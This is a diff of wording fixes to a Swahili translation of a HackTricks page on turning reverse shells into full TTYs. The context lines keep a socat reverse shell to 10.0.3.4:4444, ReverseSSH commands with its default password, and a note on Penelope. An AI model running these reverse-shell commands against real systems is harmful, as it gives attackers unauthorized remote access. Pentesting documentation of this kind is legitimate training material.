@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Full TTY
 
-Kumbuka kwamba shell uliyoweka katika mabadiliko ya `SHELL` **lazima** iwe **imeorodheshwa ndani ya** _**/etc/shells**_ au `Thamani ya mabadiliko ya SHELL haikupatikana katika faili ya /etc/shells Tukio hili limeripotiwa`. Pia, kumbuka kwamba vipande vifuatavyo vinatumika tu katika bash. Ikiwa uko katika zsh, badilisha kuwa bash kabla ya kupata shell kwa kukimbia `bash`.
+Kumbuka kwamba shell unayoweka katika mabadiliko ya `SHELL` **lazima** iwe **imeorodheshwa ndani ya** _**/etc/shells**_ au `Thamani ya mabadiliko ya SHELL haikupatikana katika faili ya /etc/shells Tukio hili limeripotiwa`. Pia, kumbuka kwamba vipande vifuatavyo vinatumika tu katika bash. Ikiwa uko katika zsh, badilisha kuwa bash kabla ya kupata shell kwa kukimbia `bash`.
 
 #### Python
 
@@ -30,7 +30,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-Unaweza kupata **idadi** ya **mifumo** na **safu** kwa kutekeleza **`stty -a`**
+Unaweza kupata **idadi** ya **mifereji** na **safuwima** kwa kutekeleza **`stty -a`**
 {% endhint %}
 
 #### script
@@ -67,11 +67,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Njia rahisi ya **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuangusha server ya ssh iliyo na uhusiano wa kudumu [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye lengo.
+Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka server ya ssh iliyo na uhusiano wa moja kwa moja [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye lengo.
 
-Hapa kuna mfano wa `x86` na binaries zilizoshinikizwa na upx. Kwa binaries nyingine, angalia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hapa kuna mfano wa `x86` wenye binaries zilizoshinikizwa na upx. Kwa binaries nyingine, angalia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Andaa mahali ili kukamata ombi la port forwarding la ssh:
+1. Andaa mahali ili kukamata ombi la port forwarding ya ssh: 
 
 {% code overflow="wrap" %}
 ```bash
@@ -104,7 +104,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* Ikiwa ombi la kupeleka bandari ya ReverseSSH lilifanikiwa, sasa unapaswa kuwa na uwezo wa kuingia kwa kutumia nenosiri la kawaida `letmeinbrudipls` katika muktadha wa mtumiaji anayekimbia `reverse-ssh(.exe)`:
+* Ikiwa ombi la kupeleka bandari la ReverseSSH lilifanikiwa, sasa unapaswa kuwa na uwezo wa kuingia kwa kutumia nenosiri la kawaida `letmeinbrudipls` katika muktadha wa mtumiaji anayekimbia `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -114,7 +114,7 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope) inasasisha kiotomatiki Linux reverse shells kuwa TTY, inashughulikia ukubwa wa terminal, inarekodi kila kitu na mengi zaidi. Pia inatoa msaada wa readline kwa Windows shells.
+[Penelope](https://github.com/brightio/penelope) inasasisha kiotomatiki Linux reverse shells kuwa TTY, inashughulikia ukubwa wa terminal, inarekodi kila kitu na mengi zaidi. Pia inatoa msaada wa readline kwa Windows shells.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
@@ -133,7 +133,7 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" al
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
